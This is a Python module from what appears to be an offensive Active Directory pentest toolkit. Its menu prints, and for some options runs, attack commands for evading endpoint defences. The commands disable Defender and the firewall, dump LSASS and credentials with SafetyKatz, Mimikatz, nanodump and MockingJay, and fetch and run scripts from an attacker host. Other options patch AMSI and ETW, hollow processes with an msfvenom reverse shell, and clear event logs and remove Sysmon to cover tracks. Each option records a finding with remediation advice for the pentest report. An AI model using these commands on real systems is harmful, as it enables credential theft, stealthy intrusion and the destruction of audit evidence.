"""
Module: EDR / AV Evasion
Techniques: Windows Defender disable (Set-MpPreference), SafetyKatz+Loader.exe
            in-memory pattern, PPL bypass, nanodump, ETW patching, AMSI variants,
            ntdll unhooking (Hell's Gate), direct syscalls,
            process hollowing, in-memory .NET, BOF execution
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("EDR / AV EVASION", "Bypass modern endpoint defenses")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(f"""
  {C}── WINDOWS DEFENDER DISABLE ─────────────────────────────────────{RST}
  [1]  Disable Defender (Set-MpPreference)  CRTP standard — all components
  [2]  SafetyKatz + Loader.exe              In-memory cred dump — no AV touch
  {C}── LSASS DUMPING (STEALTHY) ─────────────────────────────────────{RST}
  [3]  nanodump             (stealthy — bypasses Defender / CrowdStrike)
  [4]  PPLdump              (PPL bypass → full LSASS dump)
  [5]  lsassy               (remote LSASS via SMB — no binary drop)
  {C}── AMSI BYPASS ──────────────────────────────────────────────────{RST}
  [6]  AMSI Patch Variants  (in-memory AmsiScanBuffer patch)
  [7]  ETW Patching         (blind EDR telemetry)
  {C}── NTDLL UNHOOKING ──────────────────────────────────────────────{RST}
  [8]  Hell's Gate          (direct syscalls — bypass userland hooks)
  [9]  Freshcopy Unhook     (reload ntdll from disk)
  {C}── PAYLOAD DELIVERY ─────────────────────────────────────────────{RST}
  [10] In-Memory .NET       (execute .NET assembly without touching disk)
  [11] Process Hollowing    (spawn + hollow legitimate process)
  [12] BOF Execution        (Beacon Object Files via Cobalt/Sliver)
  {C}── DETECTION EVASION ────────────────────────────────────────────{RST}
  [13] RunAsPPL Disable     (registry → reboot or PPLKiller)
  [14] Clear Windows Event Logs
  {C}── ADVANCED LSASS DUMP ──────────────────────────────────────────{RST}
  [15] NanoDump + MockingJay          (shellcode injection — EDR bypass)
  [16] RWXfinder                      (find RWX DLL sections for MockingJay)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Disable Defender ─────────────────────────────────────────────────
    if c == "1":
        section("Disable Windows Defender — CRTP standard flow")
        info("Run on target machine as local admin (PowerShell)")
        tools_path = prompt("Tools folder path on target [C:\\Tools]") or "C:\\Tools"
        print(f"""
  {NEON_CYN}# Step 1 — Disable all real-time protection components{RST}
  Set-MpPreference -DisableRealtimeMonitoring $true
  Set-MpPreference -DisableBehaviorMonitoring $true
  Set-MpPreference -DisableIOAVProtection $true
  Set-MpPreference -DisableIntrusionPreventionSystem $true
  Set-MpPreference -DisableScriptScanning $true
  Set-MpPreference -MAPSReporting 0

  {NEON_CYN}# Step 2 — Add tools folder to exclusions (less noisy than full disable){RST}
  Add-MpPreference -ExclusionPath "{tools_path}"

  {NEON_CYN}# Step 3 — Disable Windows Firewall all profiles{RST}
  Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

  {NEON_CYN}# Step 4 — Verify Defender is disabled{RST}
  Get-MpComputerStatus | select RealTimeProtectionEnabled,IoavProtectionEnabled,BehaviorMonitorEnabled

  {NEON_CYN}# Remote via NXC (from Linux){RST}
  nxc smb {dc} -u '{user}' -p '{pw}' -x "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
  nxc smb {dc} -u '{user}' -p '{pw}' -x 'powershell Add-MpPreference -ExclusionPath \"{tools_path}\"'

  {NEON_YEL}OPSEC note:{RST} {DIM}Set-MpPreference generates Security event 5001 (AV disabled).
  Prefer exclusion path (step 2) over full disable where possible.{RST}
""")
        add_finding(
            "Windows Defender Disabled",
            "Critical",
            f"All Defender components disabled via Set-MpPreference on {dc}",
            "Enable tamper protection; alert on Set-MpPreference -Disable* commands",
        )

    # ── [2] SafetyKatz + Loader.exe ──────────────────────────────────────────
    elif c == "2":
        section("SafetyKatz + Loader.exe — in-memory credential dump (CRTP)")
        attacker = input_or_session("attacker_ip", "Attacker IP (HFS server)")
        hfs_port = prompt("HFS / HTTP server port [80]") or "80"
        pivot    = prompt("Pivot machine FQDN or IP (where Loader.exe runs)")
        print(f"""
  {NEON_CYN}# CRTP technique: serve tools from attacker → load in-memory via Loader.exe{RST}
  {DIM}No binary touches the target's disk — bypasses most AV signature scanning{RST}

  {NEON_CYN}Step 1 — Set up port forward on PIVOT machine (netsh portproxy){RST}
  netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport={hfs_port} connectaddress={attacker}
  {DIM}Verify: netsh interface portproxy show v4tov4{RST}

  {NEON_CYN}Step 2 — Start HFS / SimpleHTTPServer on attacker{RST}
  {DIM}# HFS (Windows HFS.exe) or Python:{RST}
  python3 -m http.server {hfs_port}   # from /path/to/tools/

  {NEON_CYN}Step 3 — Copy Loader.exe to pivot (via xcopy admin share){RST}
  xcopy .\\Loader.exe \\\\{pivot}\\C$\\

  {NEON_CYN}Step 4 — Run SafetyKatz in-memory via Loader on pivot{RST}
  {DIM}# On pivot machine:{RST}
  C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::ekeys" "exit"
  C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
  C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "lsadump::lsa /patch" "exit"
  C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "lsadump::dcsync /user:domain\\krbtgt" "exit"

  {NEON_CYN}Alternative — Invoke-Mimi in-memory (PowerShell, no exe){RST}
  iex ((New-Object Net.WebClient).DownloadString('http://{attacker}:{hfs_port}/Invoke-Mimi.ps1'))
  Invoke-Mimi -Command '"sekurlsa::ekeys"'
  Invoke-Mimi -Command '"sekurlsa::logonpasswords"'

  {NEON_CYN}Why SafetyKatz over standard mimikatz.exe?{RST}
  {DIM}SafetyKatz = Mimikatz compiled as .NET assembly → loaded via Loader.exe reflectively
  → never written to disk → bypasses most file-based AV detection{RST}
""")
        add_finding(
            "In-Memory Credential Dump (SafetyKatz/Loader)",
            "Critical",
            "SafetyKatz executed in-memory via Loader.exe + port forwarding — no disk artifact",
            "Enable memory protection (Credential Guard); monitor Loader.exe/reflective load patterns",
        )

    # ── Renumbered originals ──────────────────────────────────────────────────
    elif c == "3":
        out = prompt("Output path (default=/tmp/nano.dmp)") or "/tmp/nano.dmp"
        print(f"""
  {C}nanodump — stealthy LSASS dump:{RST}

  {Y}Linux — remote via SMB (no binary drop on target):{RST}
  nxc smb {dc} -u '{user}' -p '{pw}' -M nanodump

  {Y}Windows — local execution:{RST}
  .\\nanodump.exe --write C:\\Windows\\Temp\\nano.dmp
  .\\nanodump.exe --snapshot   # snapshot method (bypasses more AV)
  .\\nanodump.exe --fork        # fork + dump (stealthy)
  .\\nanodump.exe --dup         # handle duplication method

  {Y}Retrieve dump and parse:{RST}
  # Transfer to Linux (via SMB):
  nxc smb {dc} -u '{user}' -p '{pw}' --get-file C:\\\\Windows\\\\Temp\\\\nano.dmp {out}

  # Parse with mimikatz:
  mimikatz # sekurlsa::minidump {out}
  mimikatz # sekurlsa::logonpasswords

  # Parse with pypykatz:
  pypykatz lsa minidump {out}
""")
        run_cmd(f"nxc smb {dc} -u '{user}' -p '{pw}' -M nanodump")

    elif c == "4":
        print(f"""
  {C}PPLdump — bypass PPL / RunAsPPL → dump LSASS:{RST}

  {Y}Requirement: Local admin on target{RST}

  {Y}PPLdump (Windows — must run on target):{RST}
  .\\PPLdump.exe lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp

  {Y}PPLfault (CVE-2023-21768 — Windows 10/11):{RST}
  .\\PPLFault.exe

  {Y}Mimidrv (kernel driver — load as admin):{RST}
  # In Mimikatz:
  !+ (load mimidrv.sys)
  !processprotect /process:lsass.exe /remove
  sekurlsa::logonpasswords

  {Y}Retrieve + parse:{RST}
  nxc smb {dc} -u '{user}' -p '{pw}' --get-file \\
    C:\\\\Windows\\\\Temp\\\\lsass_dump.dmp /tmp/lsass.dmp
  pypykatz lsa minidump /tmp/lsass.dmp
""")

    elif c == "5":
        print(f"""
  {C}lsassy — remote LSASS dump via SMB (no binary drop):{RST}

  {Y}Single host:{RST}
  lsassy -d {dom} -u '{user}' -p '{pw}' {dc}

  {Y}NT hash auth:{RST}
  lsassy -d {dom} -u '{user}' -H {SESSION.get("nt_hash","<hash>")} {dc}

  {Y}Multiple hosts:{RST}
  lsassy -d {dom} -u '{user}' -p '{pw}' -t /tmp/live_hosts.txt

  {Y}Via nxc (nxc calls lsassy internally):{RST}
  nxc smb {dc} -u '{user}' -p '{pw}' -M lsassy

  {Y}Dump method options:{RST}
  lsassy -d {dom} -u '{user}' -p '{pw}' {dc} \\
    --dump-method nanodump       # nanodump method
  lsassy -d {dom} -u '{user}' -p '{pw}' {dc} \\
    --dump-method comsvcs        # comsvcs.dll (default)
  lsassy -d {dom} -u '{user}' -p '{pw}' {dc} \\
    --dump-method procdump       # sysinternals procdump
""")
        run_cmd(f"nxc smb {dc} -u '{user}' -p '{pw}' -M lsassy")

    elif c == "6":
        print(f"""
  {C}AMSI Bypass Variants — PowerShell:{RST}

  {Y}Variant 1 — AmsiScanBuffer patch (most common):{RST}
  $a=[Ref].Assembly.GetTypes();foreach($b in $a){{if($b.Name -like "*iUtils"){{}}}};
  $c=$b.GetFields('NonPublic,Static');foreach($d in $c){{if($d.Name -like "*Context"){{
  $e=$d.GetValue($null);[IntPtr]$ptr=$e;[Int32[]]$buf=@(0);
  [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}}}}

  {Y}Variant 2 — Force error (old but reliable):{RST}
  [Runtime.InteropServices.Marshal]::WriteByte(
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
      'amsiInitFailed','NonPublic,Static').GetValue($null), 1)

  {Y}Variant 3 — Matt Graeber one-liner:{RST}
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
    'amsiInitFailed','NonPublic,Static').SetValue($null,$true)

  {Y}Variant 4 — PowerShell downgrade (bypass PSv5 AMSI):{RST}
  powershell -version 2 -nop -w hidden -c <command>

  {Y}Variant 5 — Obfuscated string split:{RST}
  $s = 'Am' + 'siU' + 'tils'; ...

  {Y}Test bypass worked:{RST}
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
    'amsiInitFailed','NonPublic,Static').GetValue($null)
  # Should return: True
""")

    elif c == "7":
        print(f"""
  {C}ETW (Event Tracing for Windows) Patching — blind EDR:{RST}

  {Y}Patch EtwEventWrite — null telemetry events (PowerShell):{RST}
  $a = [Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Eventing')
  $b = [System.Diagnostics.Eventing.EventProvider]
  $m = $b.GetMethod('WriteEvent', [Reflection.BindingFlags] 'NonPublic,Instance')
  # Patch ret instruction into EtwEventWrite

  {Y}C# / in-memory patch:{RST}
  # Locate EtwEventWrite in ntdll.dll
  # Overwrite first bytes with:  0xC3 (RET) on x64
  #                               0xC2 0x14 0x00 (RET 20) on x86

  {Y}Direct via P/Invoke (add to your loader):{RST}
  var ntdll = GetModuleHandle("ntdll.dll");
  var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
  // VirtualProtect → PAGE_EXECUTE_READWRITE
  // Marshal.WriteByte(etwAddr, 0xC3)

  {Y}Verify ETW patched:{RST}
  # No events from PID should appear in:
  # Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"
""")

    elif c == "8":
        print(f"""
  {C}Hell's Gate — Direct Syscalls (bypass userland EDR hooks):{RST}

  {Y}Concept:{RST}
  EDR hooks NtReadVirtualMemory, NtOpenProcess etc in ntdll (userland).
  Direct syscalls bypass userland hooks by calling kernel directly.

  {Y}Tools that implement Hell's Gate / Halo's Gate:{RST}
  - HellsGate (C — original PoC)
  - SysWhispers2 / SysWhispers3 (generate syscall stubs)
  - RecycledGate (improved — handles patched stubs)
  - FreshyCalls (x86/x64 compatible)

  {Y}SysWhispers3 integration (example):{RST}
  # Generate stubs:
  python3 syswhispers.py --functions NtOpenProcess,NtReadVirtualMemory,NtWriteVirtualMemory \\
    -o syscalls

  # Include in your C project:
  #include "syscalls.h"
  // Use SW3_NtOpenProcess() instead of NtOpenProcess()

  {Y}Check if hooks are present (detect EDR):{RST}
  # Look for JMP instructions at start of Nt* functions in ntdll
  # Clean NTDLL from disk = no JMP at start (unhooking result)
""")

    elif c == "9":
        print(f"""
  {C}Freshcopy ntdll Unhook — reload clean ntdll from disk:{RST}

  {Y}Concept:{RST}
  EDR injects hooks into in-memory ntdll.
  Reload a fresh copy from disk (C:\\Windows\\System32\\ntdll.dll)
  and overwrite the hooked .text section → clean syscalls restored.

  {Y}PowerShell (reflective load):{RST}
  $bytes = [System.IO.File]::ReadAllBytes("C:\\Windows\\System32\\ntdll.dll")
  $assembly = [System.Reflection.Assembly]::Load($bytes)

  {Y}C implementation steps:{RST}
  1. OpenFile("C:\\Windows\\System32\\ntdll.dll")
  2. MapViewOfFile (read-only)
  3. GetModuleHandle("ntdll.dll") → in-memory base
  4. VirtualProtect(.text, PAGE_EXECUTE_READWRITE)
  5. memcpy(in_memory_.text, disk_.text)
  6. VirtualProtect(.text, PAGE_EXECUTE_READ)

  {Y}Ready-made tools:{RST}
  - RefleXXion (C++ — freshcopy + direct syscalls)
  - ModuleShifting (Cobalt Strike BOF)
  - Shhhloader (shellcode loader with unhooking)
""")

    elif c == "10":
        assembly = prompt("Assembly path or URL (e.g. /tmp/Rubeus.exe)")
        args     = prompt("Arguments (e.g. kerberoast /format:hashcat)")
        print(f"""
  {C}In-Memory .NET Assembly Execution (no disk write):{RST}

  {Y}PowerShell — direct load + execute:{RST}
  $data = [System.IO.File]::ReadAllBytes('{assembly}')
  $asm  = [System.Reflection.Assembly]::Load($data)
  $type = $asm.GetType('Rubeus.Program')
  $main = $type.GetMethod('Main')
  $main.Invoke($null, [object[]]@(, [string[]]@('{args}')))

  {Y}From URL (in-memory download + execute):{RST}
  $data = (New-Object Net.WebClient).DownloadData('http://{SESSION.get("attacker_ip") or "<ATTACKER_IP>"}/{assembly.split("/")[-1]}')
  [System.Reflection.Assembly]::Load($data).GetType('Rubeus.Program').GetMethod('Main').Invoke($null,[object[]]@(,[string[]]@('{args}')))

  {Y}Bypass AMSI first, then execute:{RST}
  # 1. Run AMSI bypass (option [4] above)
  # 2. Then load assembly in-memory

  {Y}Execute-Assembly (Cobalt Strike / Sliver):{RST}
  execute-assembly {assembly} {args}   # Cobalt Strike
  execute-assembly -path {assembly} -args '{args}'   # Sliver
""")

    elif c == "11":
        process = prompt("Process to hollow (e.g. svchost.exe, RuntimeBroker.exe)") or "svchost.exe"
        payload = prompt("Shellcode path (e.g. /tmp/shellcode.bin)")
        print(f"""
  {C}Process Hollowing — spawn {process} and replace with payload:{RST}

  {Y}Steps (C/C++ implementation):{RST}
  1. CreateProcess("{process}", CREATE_SUSPENDED)
  2. NtUnmapViewOfSection (hollow the original image)
  3. VirtualAllocEx (allocate memory for payload)
  4. WriteProcessMemory (write shellcode)
  5. SetThreadContext (point EIP/RIP to payload)
  6. ResumeThread

  {Y}msfvenom shellcode generation:{RST}
  msfvenom -p windows/x64/shell_reverse_tcp \\
    LHOST={SESSION.get("attacker_ip") or "<ATTACKER_IP>"} LPORT=4444 \\
    -f raw -o {payload}

  {Y}Ready-made hollowing tools:{RST}
  .\\RunPE.exe {process} {payload}
  .\\ProcessHollowing.exe {process} {payload}

  {Y}Legitimate target processes (blend in):{RST}
  svchost.exe, RuntimeBroker.exe, SearchIndexer.exe,
  WmiPrvSE.exe, dllhost.exe, werfault.exe, sihost.exe
""")

    elif c == "12":
        print(f"""
  {C}Beacon Object Files (BOF) — in-process code execution:{RST}

  {Y}What is a BOF:{RST}
  Small compiled COFF object file executed inside Beacon/agent process.
  No new process created → very stealthy.
  Uses Beacon/Sliver internal APIs.

  {Y}Common BOFs:{RST}
  - TrustedSec BOF Collection (kerberoast, ldap enum, arp scan)
  - nanodump BOF
  - SA_AMSI (AMSI bypass BOF)
  - inject-assembly (in-process .NET loader)
  - unhook-bof (ntdll freshcopy via BOF)
  - adcs_enum (ADCS enumeration BOF)
  - kerbeus (Rubeus-as-BOF)

  {Y}Cobalt Strike — run BOF:{RST}
  inline-execute /path/to/file.o [args]
  # or via aggressor:
  beacon_inline_execute($bid, $bof_data, $args)

  {Y}Sliver — BOF execution:{RST}
  execute-assembly -bof /path/to/file.o

  {Y}Compile your own BOF:{RST}
  x86_64-w64-mingw32-gcc -o mybof.o -c mybof.c \\
    -masm=intel -Wall
""")

    elif c == "13":
        print(f"""
  {C}Disable RunAsPPL (LSA Protection):{RST}

  {Y}Method 1 — Registry (requires reboot, admin):{RST}
  reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" \\
    /v RunAsPPL /t REG_DWORD /d 0 /f
  # Reboot required

  {Y}Method 2 — PPLKiller (no reboot, kernel driver):{RST}
  .\\PPLKiller.exe /disablePPL lsass.exe

  {Y}Method 3 — mimidrv (Mimikatz kernel driver):{RST}
  # In Mimikatz (admin required):
  !+
  !processprotect /process:lsass.exe /remove
  sekurlsa::logonpasswords

  {Y}Verify PPL status:{RST}
  Get-Process lsass | Select-Object -ExpandProperty ProtectionLevel
  # or check:
  reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL
""")
        run_cmd(
            f"nxc smb {dc} -u '{user}' -p '{pw}' "
            f"-x 'reg query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v RunAsPPL'"
        )

    elif c == "14":
        print(f"""
  {C}Clear Windows Event Logs (cover tracks):{RST}

  {NEON_CYN}Clear ALL event logs (PowerShell — requires admin):{RST}
  Get-EventLog -List | ForEach-Object {{ Clear-EventLog -LogName $_.Log }}

  {NEON_CYN}Clear specific security-relevant logs:{RST}
  wevtutil cl System
  wevtutil cl Security
  wevtutil cl Application
  wevtutil cl "Windows PowerShell"
  wevtutil cl "Microsoft-Windows-PowerShell/Operational"
  wevtutil cl "Microsoft-Windows-Sysmon/Operational"
  wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"

  {NEON_CYN}Remote via NXC:{RST}
  nxc smb {dc} -u '{user}' -p '{pw}' \\
    -x "wevtutil cl Security && wevtutil cl System && wevtutil cl Application"

  {NEON_CYN}Disable PowerShell Script Block / Module logging:{RST}
  Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell \\
    -Name EnableScriptBlockLogging -Value 0
  Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell \\
    -Name EnableModuleLogging -Value 0

  {NEON_CYN}Disable Sysmon (if running) — stop service:{RST}
  sc stop Sysmon64
  sc delete Sysmon64

  {NEON_CYN}Clear Security log via WMI (alternate):{RST}
  (Get-WmiObject -Class Win32_NTEventlogFile -Filter "LogFileName='Security'").ClearEventLog()

  {NEON_YEL}OPSEC note:{RST} {DIM}Clearing logs generates Event ID 1102 (Security log cleared)
  and Event ID 104 (System log cleared). Defenders alert on these.
  Prefer disabling forward logging (ETW) before operations over clearing after.{RST}
""")

    elif c == "15":
        attacker = input_or_session("attacker_ip", "Attacker IP")
        print(f"""
  {NEON_CYN}NanoDump + MockingJay — EDR-Bypass LSASS Dump via Process Injection:{RST}

  {DIM}MockingJay abuses RWX sections in legitimate DLLs (e.g. msys-2.0.dll)
  to inject shellcode without VirtualAlloc/VirtualProtect calls → evades
  most memory-scanning EDR hooks. Combine with NanoDump for a stealthy dump.{RST}

  ── Step 1: Generate NanoDump shellcode with Donut ────────────────────────
  # Convert nanodump.x64.exe → shellcode blob
  donut.exe -f 1 -p '-sc -f 1 --write C:\\\\Windows\\\\Temp\\\\nano.dmp' \\
    -i nanodump.x64.exe -o nano.bin

  # Verify shellcode created:
  ls -lh nano.bin

  ── Step 2: Copy shellcode to target ─────────────────────────────────────
  # Via SMB admin share:
  copy .\\nano.bin \\\\<target>\\C$\\Windows\\Temp\\nano.bin

  ── Step 3: Inject via MockingJay ────────────────────────────────────────
  # On target machine (run as admin):
  .\\MockingJay.exe C:\\Windows\\Temp\\nano.bin

  # Self-injection variant (inject into own process):
  .\\MockingJay.exe 127.0.0.1 C:\\Windows\\Temp\\nano.bin

  # MockingJay auto-selects a process with RWX section in legitimate DLL
  # Common targets: msys-2.0.dll, git.exe, or similar signed binaries

  ── Step 4: Retrieve LSASS dump ──────────────────────────────────────────
  # Copy dump back to attacker:
  copy \\\\<target>\\C$\\Windows\\Temp\\nano.dmp C:\\AD\\Tools\\nano.dmp

  # Or via NXC:
  nxc smb <target> -u '{user}' -p '{pw}' \\
    --get-file C:\\\\Windows\\\\Temp\\\\nano.dmp /tmp/nano.dmp

  ── Step 5: Parse dump ───────────────────────────────────────────────────
  # Repair + parse with pypykatz:
  python3 -c "import nanodump; nanodump.fix_dump('/tmp/nano.dmp', '/tmp/nano_fixed.dmp')"
  pypykatz lsa minidump /tmp/nano_fixed.dmp

  # Or mimikatz:
  mimikatz # sekurlsa::minidump C:\\nano.dmp
  mimikatz # sekurlsa::logonpasswords

  {NEON_CYN}Why NanoDump + MockingJay beats standard methods:{RST}
  {DIM}• MockingJay: no VirtualAlloc/VirtualProtect → bypasses memory allocation hooks
  • NanoDump: no OpenProcess(lsass) → bypasses handle hooks
  • No disk write for injection stub → file-based AV blind
  • Works against CrowdStrike Falcon, Defender, SentinelOne (in many configs)
  • Tested against: Windows 10/11, Server 2019/2022{RST}

  {NEON_CYN}Alternative — NanoDump snapshot method (standalone):{RST}
  .\\nanodump.exe --snapshot    # fork+snapshot, no direct LSASS handle
  .\\nanodump.exe --dup         # handle duplication from another process
  .\\nanodump.exe --fork        # fork LSASS then dump fork

  {NEON_CYN}Tool sources:{RST}
  {DIM}• NanoDump:   github.com/helpsystems/nanodump
  • MockingJay:  github.com/SecurityRiskAdvisors/MockingJay
  • Donut:       github.com/TheWover/donut{RST}
""")
        add_finding("NanoDump + MockingJay LSASS Dump", "Critical",
                    "LSASS dumped via shellcode injection using MockingJay RWX abuse — bypasses EDR memory hooks",
                    "Enable Credential Guard; deploy memory-integrity scanning; alert on LSASS handle open from unexpected parents")

    elif c == "16":
        print(f"""
  {NEON_CYN}RWXfinder — Discover RWX Sections in DLLs (MockingJay prerequisite):{RST}

  {DIM}MockingJay requires a DLL loaded in a target process that has an
  RWX (Read-Write-Execute) memory section. RWXfinder enumerates all
  loaded modules to identify exploitable RWX regions.{RST}

  ── Step 1: Run RWXfinder on target ──────────────────────────────────────
  # Enumerate all processes and their loaded modules for RWX sections:
  .\\RWXfinder.exe

  # Target a specific process by PID:
  .\\RWXfinder.exe -pid 1234

  # Export results to file:
  .\\RWXfinder.exe -o C:\\Windows\\Temp\\rwx_results.txt

  ── Step 2: Interpret output ──────────────────────────────────────────────
  # Output format:
  # [PID] ProcessName | DLL: C:\\path\\to\\module.dll | RWX @ 0x7FF...  Size: 0x1000
  #
  # Good candidates for MockingJay injection:
  # • msys-2.0.dll        (Git for Windows — widely installed)
  # • libgcc_s_seh-1.dll  (MinGW runtime)
  # • Any DLL loaded in target process with an RWX segment

  ── Step 3: Use result with MockingJay ────────────────────────────────────
  # Once you identify a process with RWX DLL section, inject payload:
  .\\MockingJay.exe C:\\Windows\\Temp\\nano.bin

  # MockingJay internally re-runs similar enumeration to find an RWX region.
  # RWXfinder helps you verify exploitability before deploying MockingJay.

  {NEON_CYN}Why RWX sections exist:{RST}
  {DIM}Some DLLs (especially those compiled without ASLR/DEP hardening or with
  certain JIT compilers) map executable memory as RW then RX without splitting
  the section — resulting in pages that remain RWX throughout the process lifetime.
  MockingJay copies shellcode into these sections and calls them directly —
  no VirtualAlloc, no VirtualProtect, no suspicious API calls.{RST}

  {NEON_CYN}Common RWX DLL findings:{RST}
  {DIM}  msys-2.0.dll        (Git for Windows)
  libgcc_s_seh-1.dll  (MinGW/MSYS2 toolchain)
  PDFium / CEF DLLs   (browser-integrated apps)
  Python3xx.dll       (Python runtime){RST}

  {NEON_CYN}Tool source:{RST}
  {DIM}• RWXfinder: github.com/thefLink/Hunt-Sleeping-Beacons (similar concept)
  • MockingJay: github.com/SecurityRiskAdvisors/MockingJay{RST}
""")
        add_finding("RWXfinder Recon", "Medium",
                    "RWXfinder used to enumerate RWX DLL sections — prerequisite for MockingJay EDR bypass",
                    "Enable ACG (Arbitrary Code Guard) for protected processes; audit DLLs with RWX sections; use memory integrity enforcement")

    pause()
